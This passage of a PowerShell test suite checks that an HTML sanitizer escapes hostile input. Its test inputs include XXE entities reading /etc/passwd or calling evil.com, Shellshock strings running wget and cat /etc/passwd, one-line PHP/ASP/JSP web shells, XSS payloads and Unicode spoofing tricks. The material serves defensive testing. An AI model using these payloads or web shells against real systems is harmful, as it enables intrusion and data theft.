    -Expected '&lt;!DOCTYPE foo [&lt;!ENTITY xxe SYSTEM &quot;http://127.0.0.1:80&quot;&gt;]&gt;&lt;foo&gt;&amp;xxe;&lt;/foo&gt;'

Run-Test -TestName "XXE parameter entity" `
    -TestInput '<!ENTITY % foo SYSTEM "file:///etc/passwd"> %foo;' `
    -Expected '&lt;!ENTITY % foo SYSTEM &quot;file:///etc/passwd&quot;&gt; %foo;'

# XML stylesheet attacks
Run-Test -TestName "XML stylesheet javascript" `
    -TestInput '<?xml-stylesheet href="javascript:alert(1)"?><root/>' `
    -Expected '&lt;?xml-stylesheet href=&quot;javascript:alert(1)&quot;?&gt;&lt;root/&gt;'

Run-Test -TestName "XML stylesheet data URI" `
    -TestInput '<?xml-stylesheet type="text/xsl" href="data:,%3Cxsl:transform%3E"?>' `
    -Expected '&lt;?xml-stylesheet type=&quot;text/xsl&quot; href=&quot;data:,%3Cxsl:transform%3E&quot;?&gt;'

Run-Test -TestName "XML stylesheet expression" `
    -TestInput '<?xml-stylesheet type="text/css"?><root style="x:expression(alert(1))"/>' `
    -Expected '&lt;?xml-stylesheet type=&quot;text/css&quot;?&gt;&lt;root style=&quot;x:expression(alert(1))&quot;/&gt;'

# XML CDATA and entities
Run-Test -TestName "XML CDATA with script" `
    -TestInput '<![CDATA[<script>alert(1)</script>]]>' `
    -Expected '&lt;![CDATA[&lt;script&gt;alert(1)&lt;/script&gt;]]&gt;'

Run-Test -TestName "XML entity reference" `
    -TestInput '<!DOCTYPE xxe [<!ENTITY foo "malicious">]><root>&foo;</root>' `
    -Expected '&lt;!DOCTYPE xxe [&lt;!ENTITY foo &quot;malicious&quot;&gt;]&gt;&lt;root&gt;&amp;foo;&lt;/root&gt;'

# XML with embedded HTML/SVG
Run-Test -TestName "XML iframe in XSLT" `
    -TestInput '<xsl:stylesheet><xsl:template match="/"><iframe src="javascript:alert(1)"></iframe></xsl:template></xsl:stylesheet>' `
    -Expected '&lt;xsl:stylesheet&gt;&lt;xsl:template match=&quot;/&quot;&gt;&lt;iframe src=&quot;javascript:alert(1)&quot;&gt;&lt;/iframe&gt;&lt;/xsl:template&gt;&lt;/xsl:stylesheet&gt;'

Run-Test -TestName "XML entity SVG DOCTYPE" `
    -TestInput '<!DOCTYPE svg [<!ENTITY E1 "stroke:rgb(255,0,0);">]><svg><line style="&E1;"/></svg>' `
    -Expected '&lt;!DOCTYPE svg [&lt;!ENTITY E1 &quot;stroke:rgb(255,0,0);&quot;&gt;]&gt;&lt;svg&gt;&lt;line style=&quot;&amp;E1;&quot;/&gt;&lt;/svg&gt;'

# =============================================================================
# Unix/Shell Injection Signatures (from unix/*.txt and shell/*.txt)
# =============================================================================

# Bash Shellshock variants
Run-Test -TestName "Shellshock basic" `
    -TestInput "() { :;}; echo vulnerable" `
    -Expected "() { :;}; echo vulnerable"

Run-Test -TestName "Shellshock with SVG" `
    -TestInput "() {<svg onload=`"alert(1)`"> {')' `"(</svg>`" {& }; echo -e `"header\x3axss`"" `
    -Expected "() {&lt;svg onload=&quot;alert(1)&quot;&gt; {&#39;)&#39; &quot;(&lt;/svg&gt;&quot; {&amp; }; echo -e &quot;header\x3axss&quot;"

Run-Test -TestName "Shellshock wget" `
    -TestInput '() { :;}; /bin/bash -c "wget http://evil.com"' `
    -Expected "() { :;}; /bin/bash -c &quot;wget http://evil.com&quot;"

# Command injection
Run-Test -TestName "Backtick command substitution" `
    -TestInput "\u0060dir\u0060" `
    -Expected "\u0060dir\u0060"

Run-Test -TestName "Pipe command injection" `
    -TestInput "|dir|" `
    -Expected "|dir|"

Run-Test -TestName "Newline command injection" `
    -TestInput "test\nnetstat -a%\n" `
    -Expected "test\nnetstat -a%\n"

# Web shell patterns
Run-Test -TestName "ASP web shell" `
    -TestInput '<% eval request("cmd") %>' `
    -Expected "&lt;% eval request(&quot;cmd&quot;) %&gt;"

Run-Test -TestName "PHP web shell" `
    -TestInput '<?php system($_GET["cmd"]) ?>' `
    -Expected '&lt;?php system($_GET[&quot;cmd&quot;]) ?&gt;'

Run-Test -TestName "JSP web shell" `
    -TestInput '<% Runtime.getruntime().exec(request.getParameter("cmd")) %>' `
    -Expected "&lt;% Runtime.getruntime().exec(request.getParameter(&quot;cmd&quot;)) %&gt;"

# =============================================================================
# Random/Fuzzing Signatures (from random/*.txt)
# =============================================================================

# Null byte injections
Run-Test -TestName "Null byte basic" `
    -TestInput "test\0null" `
    -Expected "test\0null"

Run-Test -TestName "Null byte URL encoded" `
    -TestInput "test%00null" `
    -Expected "test%00null"

Run-Test -TestName "Multiple null bytes" `
    -TestInput "\0\0\0" `
    -Expected "\0\0\0"

# Script tag variations
Run-Test -TestName "Script with \x20 whitespace" `
    -TestInput '<script\x20type="text/javascript">alert(1);</script>' `
    -Expected "&lt;script\x20type=&quot;text/javascript&quot;&gt;alert(1);&lt;/script&gt;"

Run-Test -TestName "Script with \x3E encoding" `
    -TestInput '<script\x3Etype="text/javascript">alert(1);</script>' `
    -Expected "&lt;script\x3Etype=&quot;text/javascript&quot;&gt;alert(1);&lt;/script&gt;"

Run-Test -TestName "Script with \x00 null" `
    -TestInput '<\x00script>alert(1)</script>' `
    -Expected "&lt;\x00script&gt;alert(1)&lt;/script&gt;"

# Boolean/special values
Run-Test -TestName "Boolean TRUE" `
    -TestInput "TRUE" `
    -Expected "TRUE"

Run-Test -TestName "Boolean FALSE" `
    -TestInput "FALSE" `
    -Expected "FALSE"

Run-Test -TestName "String NULL" `
    -TestInput "NULL" `
    -Expected "NULL"

# =============================================================================
# JSON Injection Signatures (from json/*.txt)
# =============================================================================

Run-Test -TestName "JSON empty object" `
    -TestInput '{}' `
    -Expected '{}'

Run-Test -TestName "JSON with quotes" `
    -TestInput '{"key":"value"}' `
    -Expected '{&quot;key&quot;:&quot;value&quot;}'

Run-Test -TestName "JSON null byte key" `
    -TestInput '{"\x00":"value"}' `
    -Expected '{&quot;\x00&quot;:&quot;value&quot;}'

Run-Test -TestName "JSON __proto__ pollution" `
    -TestInput '{"__proto__":{"isAdmin":true}}' `
    -Expected '{&quot;__proto__&quot;:{&quot;isAdmin&quot;:true}}'

Run-Test -TestName "JSON constructor injection" `
    -TestInput '{"constructor":"alert(1)"}' `
    -Expected '{&quot;constructor&quot;:&quot;alert(1)&quot;}'

Run-Test -TestName "JSON toString override" `
    -TestInput '{"toString":"while(1);"}' `
    -Expected '{&quot;toString&quot;:&quot;while(1);&quot;}'

# =============================================================================
# SOAP Injection Signatures (from soap/*.txt)
# =============================================================================

Run-Test -TestName "SOAP Body XXE CDATA" `
    -TestInput '<soap:Body><foo><![CDATA[<!DOCTYPE doc [<!ENTITY % dtd SYSTEM "http://evil.com"> %dtd;]><xxx/>]]></foo></soap:Body>' `
    -Expected '&lt;soap:Body&gt;&lt;foo&gt;&lt;![CDATA[&lt;!DOCTYPE doc [&lt;!ENTITY % dtd SYSTEM &quot;http://evil.com&quot;&gt; %dtd;]&gt;&lt;xxx/&gt;]]&gt;&lt;/foo&gt;&lt;/soap:Body&gt;'

# =============================================================================
# User Agent Signatures (from ua/*.txt)
# =============================================================================

Run-Test -TestName "Bash UA Shellshock" `
    -TestInput "() { :; }; echo; echo; /bin/bash -c 'cat /etc/passwd'" `
    -Expected "() { :; }; echo; echo; /bin/bash -c &#39;cat /etc/passwd&#39;"

# =============================================================================
# URI/Protocol Handler Signatures (from uri/*.txt)
# =============================================================================

Run-Test -TestName "URI protocol: data" `
    -TestInput "data:text/html,<script>alert(1)</script>" `
    -Expected "data:text/html,&lt;script&gt;alert(1)&lt;/script&gt;"

Run-Test -TestName "URI protocol: blob" `
    -TestInput "blob:https://example.com/uuid" `
    -Expected "blob:https://example.com/uuid"

Run-Test -TestName "URI protocol: chrome-extension" `
    -TestInput "chrome-extension://id/script.js" `
    -Expected "chrome-extension://id/script.js"

Run-Test -TestName "URI protocol: bitcoin" `
    -TestInput "bitcoin:address?amount=1" `
    -Expected "bitcoin:address?amount=1"

Run-Test -TestName "URI protocol: about" `
    -TestInput "about:blank" `
    -Expected "about:blank"

# =============================================================================
# Character Set and Encoding Tests
# =============================================================================

# UTF-8 BOM (Byte Order Mark)
Run-Test -TestName "UTF-8 BOM at start" `
    -TestInput "$([char]0xFEFF)test content" `
    -Expected "$([char]0xFEFF)test content"

# Various UTF-8 encoded characters
Run-Test -TestName "UTF-8 multi-byte characters" `
    -TestInput "Hello 世界 🌍 тест" `
    -Expected "Hello 世界 🌍 тест"

Run-Test -TestName "UTF-8 emoji sequences" `
    -TestInput "👨‍👩‍👧‍👦 👍🏿 🏳️‍🌈" `
    -Expected "👨‍👩‍👧‍👦 👍🏿 🏳️‍🌈"

# Character encoding attacks
Run-Test -TestName "UTF-7 XSS attempt" `
    -TestInput "+ADw-script+AD4-alert(1)+ADw-/script+AD4-" `
    -Expected "+ADw-script+AD4-alert(1)+ADw-/script+AD4-"

Run-Test -TestName "UTF-7 with charset meta" `
    -TestInput '<meta charset="UTF-7">+ADw-script+AD4-' `
    -Expected '&lt;meta charset=&quot;UTF-7&quot;&gt;+ADw-script+AD4-'

# Overlong UTF-8 encodings (should be rejected by proper UTF-8 validation)
Run-Test -TestName "Overlong UTF-8 for less-than" `
    -TestInput "test%C0%BCscript" `
    -Expected "test%C0%BCscript"

# HTML entities in various forms
Run-Test -TestName "Decimal HTML entity" `
    -TestInput "&#60;script&#62;" `
    -Expected "&amp;#60;script&amp;#62;"

Run-Test -TestName "Hex HTML entity uppercase" `
    -TestInput "&#x3C;script&#x3E;" `
    -Expected "&amp;#x3C;script&amp;#x3E;"

Run-Test -TestName "Hex HTML entity lowercase" `
    -TestInput "&#x3c;script&#x3e;" `
    -Expected "&amp;#x3c;script&amp;#x3e;"

Run-Test -TestName "Mixed numeric entities" `
    -TestInput "&#60;&#x73;&#99;&#x72;&#105;&#x70;&#116;&#62;" `
    -Expected "&amp;#60;&amp;#x73;&amp;#99;&amp;#x72;&amp;#105;&amp;#x70;&amp;#116;&amp;#62;"

# Unicode normalization issues
Run-Test -TestName "Unicode combining characters" `
    -TestInput "e$([char]0x0301)$([char]0x0300)" `
    -Expected "e$([char]0x0301)$([char]0x0300)"

Run-Test -TestName "Unicode lookalike characters" `
    -TestInput "аdmin (Cyrillic а)" `
    -Expected "аdmin (Cyrillic а)"

Run-Test -TestName "Full-width characters" `
    -TestInput "＜ｓｃｒｉｐｔ＞" `
    -Expected "＜ｓｃｒｉｐｔ＞"

# Zero-width characters
Run-Test -TestName "Zero-width space" `
    -TestInput "test$([char]0x200B)content" `
    -Expected "test$([char]0x200B)content"

Run-Test -TestName "Zero-width non-joiner" `
    -TestInput "test$([char]0x200C)data" `
    -Expected "test$([char]0x200C)data"

Run-Test -TestName "Zero-width joiner" `
    -TestInput "test$([char]0x200D)value" `
    -Expected "test$([char]0x200D)value"

# Right-to-left override attacks
Run-Test -TestName "RTL override character" `
    -TestInput "file$([char]0x202E)gpj.exe" `
    -Expected "file$([char]0x202E)gpj.exe"

Run-Test -TestName "LTR override character" `
    -TestInput "test$([char]0x202D)content" `
    -Expected "test$([char]0x202D)content"

# Charset declaration attacks
Run-Test -TestName "Meta charset UTF-16" `
    -TestInput '<meta charset="UTF-16"><script>alert(1)</script>' `
    -Expected '&lt;meta charset=&quot;UTF-16&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;'

Run-Test -TestName "Meta http-equiv charset" `
    -TestInput '<meta http-equiv="Content-Type" content="text/html; charset=UTF-7">' `
    -Expected '&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=UTF-7&quot;&gt;'

# Invalid UTF-8 sequences (should be handled gracefully)
Run-Test -TestName "Invalid UTF-8 continuation" `
    -TestInput "test$([char]0x80)invalid" `
    -Expected "test$([char]0x80)invalid"

Run-Test -TestName "Invalid UTF-8 start byte" `
    -TestInput "test$([char]0xFF)data" `
    -Expected "test$([char]0xFF)data"

# Multi-byte boundary attacks
Run-Test -TestName "Multi-byte split attack" `
    -TestInput "test<scr$([char]0xC2)$([char]0xA0)ipt>" `
    -Expected "test&lt;scr$([char]0xC2)$([char]0xA0)ipt&gt;"

# BOM variations
Run-Test -TestName "UTF-16 BE BOM" `
    -TestInput "$([char]0xFEFF)<script>" `
    -Expected "$([char]0xFEFF)&lt;script&gt;"

Run-Test -TestName "UTF-32 BOM attempt" `
    -TestInput "test$([char]0xFFFE)content" `
    -Expected "test$([char]0xFFFE)content"

# Homograph attacks
Run-Test -TestName "Cyrillic homoglyph in tag" `
    -TestInput "<sсript>alert(1)</sсript>" `
    -Expected "&lt;sсript&gt;alert(1)&lt;/sсript&gt;"

Run-Test -TestName "Greek homoglyph" `
    -TestInput "αdmin access" `
    -Expected "αdmin access"

# Normalization form attacks
Run-Test -TestName "NFD vs NFC normalization" `
    -TestInput "café vs café" `
    -Expected "café vs café"

# Surrogate pairs
Run-Test -TestName "Valid surrogate pair emoji" `
    -TestInput "test$([char]0xD83D)$([char]0xDE00)emoji" `
    -Expected "test$([char]0xD83D)$([char]0xDE00)emoji"

Run-Test -TestName "Isolated high surrogate" `
    -TestInput "test$([char]0xD800)data" `
    -Expected "test$([char]0xD800)data"

Run-Test -TestName "Isolated low surrogate" `
    -TestInput "test$([char]0xDC00)content" `
    -Expected "test$([char]0xDC00)content"

# Case sensitivity in charset
Run-Test -TestName "Uppercase charset declaration" `
    -TestInput '<meta charset="ISO-8859-1"><img src=x onerror=alert(1)>' `
    -Expected '&lt;meta charset=&quot;ISO-8859-1&quot;&gt;&lt;img src=x onerror=alert(1)&gt;'

# Alternative encoding names
Run-Test -TestName "Alternative UTF-8 name" `
    -TestInput '<meta charset="utf8">' `
    -Expected '&lt;meta charset=&quot;utf8&quot;&gt;'

Run-Test -TestName "Windows-1252 charset" `
    -TestInput '<meta charset="windows-1252"><script>' `
    -Expected '&lt;meta charset=&quot;windows-1252&quot;&gt;&lt;script&gt;'

# Special Unicode categories
Run-Test -TestName "Mathematical alphanumeric symbols" `
    -TestInput "𝕒𝕝𝕖𝕣𝕥(1)" `
    -Expected "𝕒𝕝𝕖𝕣𝕥(1)"

Run-Test -TestName "Invisible separator" `
    -TestInput "test$([char]0x2063)content" `
    -Expected "test$([char]0x2063)content"

Run-Test -TestName "Word joiner character" `
    -TestInput "no$([char]0x2060)break" `
    -Expected "no$([char]0x2060)break"

# Charset confusion attacks
Run-Test -TestName "Mixed charset hints" `
    -TestInput '<meta charset="UTF-8"><meta charset="ISO-8859-1"><script>alert(1)</script>' `
    -Expected '&lt;meta charset=&quot;UTF-8&quot;&gt;&lt;meta charset=&quot;ISO-8859-1&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;'

# Non-breaking spaces and similar
Run-Test -TestName "Non-breaking space" `
    -TestInput "test$([char]0xA0)content" `
    -Expected "test$([char]0xA0)content"

Run-Test -TestName "Narrow no-break space" `
    -TestInput "test$([char]0x202F)value" `
    -Expected "test$([char]0x202F)value"

# Soft hyphen
Run-Test -TestName "Soft hyphen in tag" `
    -TestInput "<scr$([char]0xAD)ipt>" `
    -Expected "&lt;scr$([char]0xAD)ipt&gt;"

# Bidirectional text markers
Run-Test -TestName "LRM (Left-to-Right Mark)" `
    -TestInput "test$([char]0x200E)ltr" `
    -Expected "test$([char]0x200E)ltr"

Run-Test -TestName "RLM (Right-to-Left Mark)" `
    -TestInput "test$([char]0x200F)rtl" `
    -Expected "test$([char]0x200F)rtl"

# Line and paragraph separators
Run-Test -TestName "Unicode line separator" `
    -TestInput "line1$([char]0x2028)line2" `
    -Expected "line1$([char]0x2028)line2"

Run-Test -TestName "Unicode paragraph separator" `
    -TestInput "para1$([char]0x2029)para2" `
    -Expected "para1$([char]0x2029)para2"

# =============================================================================
# Edge Cases
# =============================================================================

Run-Test -TestName "Multiple consecutive entities" `
    -TestInput "&&&&<<<<>>>>" `
    -Expected "&amp;&amp;&amp;&amp;&lt;&lt;&lt;&lt;&gt;&gt;&gt;&gt;"

Run-Test -TestName "Already encoded entities (double encoding)" `
    -TestInput "&lt;script&gt;" `
    -Expected "&amp;lt;script&amp;gt;"

Run-Test -TestName "Mixed quotes" `
    -TestInput "test `"'`" nested" `
    -Expected "test &quot;&#39;&quot; nested"

Run-Test -TestName "Backslash and special chars" `
    -TestInput "C:\Windows\System32 & 'cmd'" `
    -Expected "C:\Windows\System32 &amp; &#39;cmd&#39;"

# =============================================================================
# sanitize_print Multi-line Tests
# =============================================================================

Write-Host "Test $($script:pass + $script:fail + 1): Multi-line with Sanitize-Print"
$multilineInput = @"
Line 1: <error> & 'quote'
Line 2: "test"
Line 3: Normal
"@
$result = Sanitize-Print -InputString $multilineInput
if ($result -match "&lt;error&gt;" -and $result -match "&amp;" -and $result -match "&#39;") {
    Write-Host "  ✅ PASS (contains expected entities)" -ForegroundColor Green
    $script:pass++
} else {
    Write-Host "  ❌ FAIL" -ForegroundColor Red
    $script:fail++
}
Write-Host ""

# =============================================================================
# sanitize_ref and sanitize_filename Tests
# =============================================================================

Run-Test -TestName "Ref sanitization: branch name" `
    -TestInput "feature/test-123" `
    -Expected "feature/test-123" `
    -Function "Sanitize-Ref"

Run-Test -TestName "Ref sanitization: dangerous chars replaced" `
    -TestInput "feature`$test<>|branch" `
    -Expected "feature-test-branch" `
    -Function "Sanitize-Ref"

Run-Test -TestName "Filename sanitization: slashes to underscores" `
    -TestInput "../../etc/passwd" `
    -Expected ".._.._etc_passwd" `
    -Function "Sanitize-Filename"

# =============================================================================
# Excessive newline collapse test
# =============================================================================

Write-Host "Test $($script:pass + $script:fail + 1): Excessive newlines collapsed to 3"
$excessiveNewlines = "Line1`n`n`n`n`n`n`nLine2"
$result = Sanitize-Print -InputString $excessiveNewlines
$newlineCount = ([regex]::Matches($result, "`n")).Count
if ($newlineCount -le 3) {
    Write-Host "  ✅ PASS (newlines collapsed to $newlineCount)" -ForegroundColor Green
    $script:pass++
} else {
    Write-Host "  ❌ FAIL (still has $newlineCount newlines)" -ForegroundColor Red
    $script:fail++
}
Write-Host ""

# =============================================================================
# Sanitizer version test
# =============================================================================

Write-Host "Test $($script:pass + $script:fail + 1): Sanitizer version"
$version = Sanitizer-Version
if ($version -eq "iccDEV-sanitizer-v1") {
    Write-Host "  ✅ PASS (version: $version)" -ForegroundColor Green
    $script:pass++
} else {
    Write-Host "  ❌ FAIL (unexpected version: $version)" -ForegroundColor Red
    $script:fail++
}
Write-Host ""

# =============================================================================
# Results Summary
# =============================================================================

Write-Host "=========================================="
Write-Host "Results: $script:pass passed, $script:fail failed"
Write-Host "=========================================="

if ($script:fail -eq 0) {
    Write-Host "✅ All tests PASSED" -ForegroundColor Green
    exit 0
} else {
    Write-Host "❌ Some tests FAILED" -ForegroundColor Red
    exit 1
}
